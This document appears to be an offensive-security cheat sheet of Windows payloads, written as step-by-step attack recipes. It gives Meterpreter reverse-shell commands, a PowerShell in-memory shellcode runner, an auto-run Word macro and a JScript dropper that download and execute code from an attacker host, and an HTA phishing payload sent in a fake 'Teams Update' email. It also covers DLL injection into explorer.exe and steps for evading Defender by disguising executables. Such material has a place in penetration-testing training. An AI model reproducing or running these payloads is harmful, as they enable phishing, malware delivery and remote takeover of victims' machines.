# Payloads

* [Bypass MS Defender](#bypass-ms-defender)
* [Reverse Shell MS Word Macro (Detected)](#reverse-shell-ms-word-macro-detected)
* [Basic JScript Meterpreter Dropper](#basic-jscript-meterpreter-dropper)
* [CSharp Phishing Payload with HTA and JScript](#csharp-phishing-payload-with-hta-and-jscript)
* [SharpShooter Raw Meterpreter Payload](#sharpshooter-raw-meterpreter-payload)
* [Reflective DLL Injection in PowerShell](#reflective-dll-injection-in-powershell)

# Bypass MS Defender 

Generate Shellcode for C#

```shell
python3 shellcodeCrypter-msfvenom.py kali 443 xor cs 250 windows/x64/meterpreter/reverse_http
```

Clone the [Shellcode Process Injector](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Injector) project and copy the previous shellcode at buf variable. `Build` -> `Batch Build` -> `Select a Build` -> Click on `Build` .

Rename the final executable. Use offical appilcation names like: procexp64

```shell
.\procexp64.exe
```

# Reverse Shell MS Word Macro (Detected)

Complete PowerShell script for in-memory shellcode runner

```powershell
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
	@($moduleName)), $functionName))
}

function getDelegateType {
	Param (
	[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
	[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
	$type.DefineConstructor('RTSpecialName, HideBySig, Public',	[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType ([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc, ...
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

Generate the reverse shell payload

```shell
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.203 LPORT=443 EXITFUNC=thread -f ps1
```

Create a macro that executes a PS in-memory

```vb
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.0.203/run.ps1') | IEX"
    Shell str, vbHide
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
```

# Basic JScript Meterpreter Dropper

>  Complete Jscript code to download and execute Meterpreter shell. Save as TeamsUpdate.js.

```js
var url = "http://kali/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{

    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

# C# Phishing Payload with HTA and JScript

> Create a C# payload with MSFVenom

```shell
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=kali LPORT=443 EXITFUNC=thread -f csharp
```

> Clone [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) project and replace MSFVenom output in the buf variable. Then build the solution.
After building, create the JScript payload.

```shell
DotNetToJScript.exe ExampleAssembly.dll --lang=JScript --ver=v4 -o payload.js
```

> Create a skeleton .HTA file with JScript tags. When the victim clicks on the link, the file will be downloaded and executed in-memory.

```js
<head>
<script language="JScript">
<Generated payload.js JScript Content Here>
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

> Listen with multi/handler meterpreter

```shell
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_http
set lhost kali
set lport 443
run
```

> Send phishing email. Remember to host the resource.

```shell
sendemail -f administrator@domain.com -t jose@domain.com -s 192.168.0.203 -u "URGENT - Important Teams Update" -m "Please click on this link to update Teams - http://192.168.0.203/teamsHTA.hta"
```

# SharpShooter Raw Meterpreter Payload

> Install SharpShooter

```shell
git clone https://github.com/mdsecactivebreach/SharpShooter.git
pip install -r requirements.txt
```

> Create a raw Meterpreter staged payload. If you want to obfuscate it, use shellcodeCrypter-msfvenom.py.

```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=kali LPORT=443 -f raw -o shell.txt
```

> Generating malicious Jscript file with SharpShooter

```shell
python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
```

# Reflective DLL Injection in PowerShell

> Generate Meterpreter.dll shellcode.

```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=kali LPORT=443 -f dll -o met.dll
```

> Create a remote thread with argument

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
namespace Inject {
    class Program {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
            SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        static void Main(string[] args) {
            String dir =
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";
            WebClient wc = new WebClient();
            wc.DownloadFile("http://kali/met.dll", dllName);
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr,
                Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
                "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
                addr, 0, IntPtr.Zero);
        }
    }
}
```

> Download the DLL and finding Explorer.exe process ID

```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://kali/met.dll')
$procid = (Get-Process -Name explorer).Id
```

> Import [Invoke-ReflectivePEInjection.ps1](https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1). 

```powershell
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
```

> Execute Invoke-ReflectivePEInjection

```powershell
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

> Getting a reverse shell

```
msf6 exploit(multi/handler) > run
[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] https://192.168.0.203:443 handling request from 192.168.0.59; (UUID: pm1qmw8u)
Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 1 opened (192.168.0.203:443 -> 192.168.0.59:49678)
meterpreter >
```
